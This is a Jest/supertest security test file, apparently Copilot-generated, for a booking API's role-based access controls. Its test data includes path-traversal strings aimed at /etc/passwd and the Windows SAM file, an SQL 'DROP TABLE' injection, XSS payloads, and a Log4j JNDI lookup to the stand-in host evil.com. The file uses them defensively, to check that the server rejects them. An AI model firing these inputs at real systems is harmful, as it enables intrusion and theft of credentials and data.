const request = require('supertest');
const app = require('../server');
const { createTestUser } = require('./auth-security.test');

// Generated by Copilot

describe('OWASP Authorization Testing Suite (4.5) - RBAC', () => {
    let adminToken, clientToken1, clientToken2;

    beforeAll(async () => {
        // Setup test users cu roluri diferite
        adminToken = await createTestUser('admin@test.com', 'Admin123!@#', 'admin');
        clientToken1 = await createTestUser('client1@test.com', 'Client123!@#', 'client');
        clientToken2 = await createTestUser('client2@test.com', 'Client123!@#', 'client');
    });

    describe('4.5.1 - Testing Directory Traversal/File Include', () => {
        test('should prevent path traversal attacks in file operations', async () => {
            const pathTraversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc//passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
                '....\\....\\....\\etc\\passwd'
            ];

            for (const payload of pathTraversalPayloads) {
                await request(app)
                    .get(`/api/admin/files/${encodeURIComponent(payload)}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(400); // Bad Request pentru path invalid
            }
        });

        test('should sanitize file paths in upload operations', async () => {
            const response = await request(app)
                .post('/api/admin/upload')
                .set('Authorization', `Bearer ${adminToken}`)
                .field('filename', '../../../malicious.js')
                .attach('file', Buffer.from('console.log("malicious")'), 'test.js')
                .expect(400);

            expect(response.body.error).toContain('Nume fișier invalid');
        });
    });

    describe('4.5.2 - Testing for Bypassing Authorization Schema', () => {
        test('should not allow role manipulation in JWT tokens', async () => {
            // Încearcă să modifice rolul în token
            const tamperedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0IiwiZW1haWwiOiJjbGllbnRAdGVzdC5jb20iLCJyb2xlIjoiYWRtaW4ifQ.invalid';

            await request(app)
                .get('/api/admin/cpanel')
                .set('Authorization', `Bearer ${tamperedToken}`)
                .expect(401); // Invalid token
        });

        test('should validate authorization on every request', async () => {
            const sensitiveEndpoints = [
                '/api/admin/cpanel',
                '/api/admin/manage-users',
                '/api/admin/system-settings',
                '/api/admin/security-logs'
            ];

            for (const endpoint of sensitiveEndpoints) {
                // Test fără token
                await request(app)
                    .get(endpoint)
                    .expect(401);

                // Test cu token client
                await request(app)
                    .get(endpoint)
                    .set('Authorization', `Bearer ${clientToken1}`)
                    .expect(403);

                // Test cu token admin - should work
                await request(app)
                    .get(endpoint)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);
            }
        });

        test('should not allow parameter pollution for role bypass', async () => {
            const response = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'client1@test.com',
                    password: 'Client123!@#',
                    role: 'admin', // Încearcă să forțeze rolul admin
                    'role[]': ['admin'], // Array pollution
                    roles: 'admin' // Alternative parameter
                });

            if (response.status === 200) {
                const tokenPayload = JSON.parse(
                    Buffer.from(response.body.token.split('.')[1], 'base64').toString()
                );
                expect(tokenPayload.role).toBe('client'); // Rolul trebuie să rămână client
            }
        });
    });

    describe('4.5.3 - Testing for Privilege Escalation', () => {
        test('admin should have full CPanel access', async () => {
            const response = await request(app)
                .get('/api/admin/cpanel')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.access).toBe('full');
            expect(response.body.permissions).toContain('manage_users');
            expect(response.body.permissions).toContain('system_settings');
            expect(response.body.permissions).toContain('view_all_schedules');
            expect(response.body.cpanelUrl).toBeDefined();
        });

        test('client should only access personal schedule menu', async () => {
            const response = await request(app)
                .get('/api/client/schedule')
                .set('Authorization', `Bearer ${clientToken1}`)
                .expect(200);

            expect(response.body.access).toBe('personal_only');
            expect(response.body.canAddSchedule).toBe(true);
            expect(response.body.canViewOthers).toBe(false);
            expect(response.body.schedules).toBeDefined();
        });

        test('should prevent vertical privilege escalation', async () => {
            // Client încearcă să acceseze funcții admin
            const adminEndpoints = [
                '/api/admin/cpanel',
                '/api/admin/manage-users',
                '/api/admin/delete-user/123',
                '/api/admin/system-settings'
            ];

            for (const endpoint of adminEndpoints) {
                await request(app)
                    .get(endpoint)
                    .set('Authorization', `Bearer ${clientToken1}`)
                    .expect(403);
            }
        });

        test('should prevent horizontal privilege escalation', async () => {
            // Client1 încearcă să acceseze datele Client2
            const client2Resources = [
                '/api/client/schedule/client2-specific',
                '/api/client/profile/client2@test.com',
                '/api/client/notifications/client2-id'
            ];

            for (const resource of client2Resources) {
                await request(app)
                    .get(resource)
                    .set('Authorization', `Bearer ${clientToken1}`)
                    .expect(403);
            }
        });

        test('should enforce least privilege principle', async () => {
            // Testează că fiecare rol are doar permisiunile necesare

            // Admin permissions
            const adminResponse = await request(app)
                .get('/api/admin/permissions')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(adminResponse.body.permissions).toEqual([
                'manage_users',
                'view_all_schedules',
                'system_settings',
                'cpanel_access',
                'security_logs'
            ]);

            // Client permissions  
            const clientResponse = await request(app)
                .get('/api/client/permissions')
                .set('Authorization', `Bearer ${clientToken1}`)
                .expect(200);

            expect(clientResponse.body.permissions).toEqual([
                'view_own_schedule',
                'add_schedule',
                'edit_own_profile',
                'view_own_notifications'
            ]);
        });
    });

    describe('4.5.4 - Testing for Insecure Direct Object References', () => {
        test('should prevent access to other users data by ID manipulation', async () => {
            // Client1 încearcă să acceseze profilul Client2 prin ID
            const userIds = ['1', '2', '999', 'admin', 'client2'];

            for (const userId of userIds) {
                await request(app)
                    .get(`/api/user/${userId}/profile`)
                    .set('Authorization', `Bearer ${clientToken1}`)
                    .expect(403); // Should be forbidden unless it's own ID
            }
        });

        test('should validate ownership before allowing operations', async () => {
            // Test crearea unei programări
            const scheduleResponse = await request(app)
                .post('/api/client/schedule')
                .set('Authorization', `Bearer ${clientToken1}`)
                .send({
                    date: '2024-01-15',
                    time: '10:00',
                    service: 'Consultanță'
                })
                .expect(201);

            const scheduleId = scheduleResponse.body.scheduleId;

            // Client1 poate să-și editeze programarea
            await request(app)
                .put(`/api/client/schedule/${scheduleId}`)
                .set('Authorization', `Bearer ${clientToken1}`)
                .send({
                    time: '11:00'
                })
                .expect(200);

            // Client2 NU poate edita programarea Client1
            await request(app)
                .put(`/api/client/schedule/${scheduleId}`)
                .set('Authorization', `Bearer ${clientToken2}`)
                .send({
                    time: '12:00'
                })
                .expect(403);
        });

        test('should use UUIDs or non-sequential IDs for sensitive resources', async () => {
            const response = await request(app)
                .post('/api/client/schedule')
                .set('Authorization', `Bearer ${clientToken1}`)
                .send({
                    date: '2024-01-16',
                    time: '14:00',
                    service: 'Revizie'
                })
                .expect(201);

            // ID-ul trebuie să fie UUID sau hash, nu secvențial
            const scheduleId = response.body.scheduleId;
            expect(scheduleId).toMatch(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/);
        });

        test('admin can access all resources but clients cannot', async () => {
            // Admin poate vedea toate programările
            const adminResponse = await request(app)
                .get('/api/admin/all-schedules')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(adminResponse.body.schedules).toBeDefined();
            expect(Array.isArray(adminResponse.body.schedules)).toBe(true);

            // Client nu poate vedea toate programările
            await request(app)
                .get('/api/admin/all-schedules')
                .set('Authorization', `Bearer ${clientToken1}`)
                .expect(403);
        });
    });

    describe('Session Management Security', () => {
        test('should implement secure session management', async () => {
            const loginResponse = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'admin@test.com',
                    password: 'Admin123!@#'
                })
                .expect(200);

            const token = loginResponse.body.token;

            // Token trebuie să expire după timpul configurat
            jest.advanceTimersByTime(24 * 60 * 60 * 1000); // 24 ore

            await request(app)
                .get('/api/admin/cpanel')
                .set('Authorization', `Bearer ${token}`)
                .expect(401); // Token expired
        });

        test('should invalidate sessions on logout', async () => {
            const loginResponse = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'client1@test.com',
                    password: 'Client123!@#'
                })
                .expect(200);

            const token = loginResponse.body.token;

            // Logout
            await request(app)
                .post('/api/auth/logout')
                .set('Authorization', `Bearer ${token}`)
                .expect(200);

            // Token trebuie să fie invalid după logout
            await request(app)
                .get('/api/client/schedule')
                .set('Authorization', `Bearer ${token}`)
                .expect(401);
        });
    });

    describe('Input Validation & Sanitization', () => {
        test('should validate and sanitize all inputs', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                '"; DROP TABLE users; --',
                '../../etc/passwd',
                '${jndi:ldap://evil.com/a}', // Log4j style
                '{{7*7}}', // Template injection
                'javascript:alert(1)'
            ];

            for (const input of maliciousInputs) {
                await request(app)
                    .post('/api/client/schedule')
                    .set('Authorization', `Bearer ${clientToken1}`)
                    .send({
                        date: input,
                        time: input,
                        service: input,
                        notes: input
                    })
                    .expect(400); // Bad request pentru input invalid
            }
        });

        test('should prevent XSS in all text fields', async () => {
            const response = await request(app)
                .post('/api/client/schedule')
                .set('Authorization', `Bearer ${clientToken1}`)
                .send({
                    date: '2024-01-17',
                    time: '15:00',
                    service: 'Test<script>alert("xss")</script>Service',
                    notes: '<img src="x" onerror="alert(1)">'
                })
                .expect(201);

            // Răspunsul trebuie să fie sanitizat
            expect(response.body.service).not.toContain('<script>');
            expect(response.body.notes).not.toContain('<img');
        });
    });
});

describe('Integration Tests - Role Separation', () => {
    test('complete admin workflow - CPanel access', async () => {
        // Login ca admin
        const loginResponse = await request(app)
            .post('/api/auth/login')
            .send({
                email: 'admin@test.com',
                password: 'Admin123!@#'
            })
            .expect(200);

        const adminToken = loginResponse.body.token;

        // Accesează CPanel-ul direct
        const cpanelResponse = await request(app)
            .get('/api/admin/cpanel')
            .set('Authorization', `Bearer ${adminToken}`)
            .expect(200);

        expect(cpanelResponse.body.access).toBe('full');
        expect(cpanelResponse.body.role).toBe('admin');
        expect(cpanelResponse.body.redirectTo).toBe('/admin/cpanel');

        // Poate gestiona utilizatori
        const usersResponse = await request(app)
            .get('/api/admin/manage-users')
            .set('Authorization', `Bearer ${adminToken}`)
            .expect(200);

        expect(usersResponse.body.users).toBeDefined();
        expect(usersResponse.body.canCreateUsers).toBe(true);
        expect(usersResponse.body.canDeleteUsers).toBe(true);
    });

    test('complete client workflow - Schedule menu access', async () => {
        // Login ca client
        const loginResponse = await request(app)
            .post('/api/auth/login')
            .send({
                email: 'client1@test.com',
                password: 'Client123!@#'
            })
            .expect(200);

        const clientToken = loginResponse.body.token;

        // Accesează meniul de programări
        const scheduleResponse = await request(app)
            .get('/api/client/schedule')
            .set('Authorization', `Bearer ${clientToken}`)
            .expect(200);

        expect(scheduleResponse.body.access).toBe('personal_only');
        expect(scheduleResponse.body.role).toBe('client');
        expect(scheduleResponse.body.redirectTo).toBe('/client/schedule-menu');

        // Poate adăuga programări
        const addScheduleResponse = await request(app)
            .post('/api/client/schedule')
            .set('Authorization', `Bearer ${clientToken}`)
            .send({
                date: '2024-01-20',
                time: '09:00',
                service: 'Inspectia tehnica periodica',
                vehicleDetails: {
                    plate: 'B123XYZ',
                    brand: 'Dacia',
                    model: 'Logan'
                }
            })
            .expect(201);

        expect(addScheduleResponse.body.scheduleId).toBeDefined();
        expect(addScheduleResponse.body.status).toBe('confirmed');

        // NU poate accesa funcții admin
        await request(app)
            .get('/api/admin/cpanel')
            .set('Authorization', `Bearer ${clientToken}`)
            .expect(403);
    });
});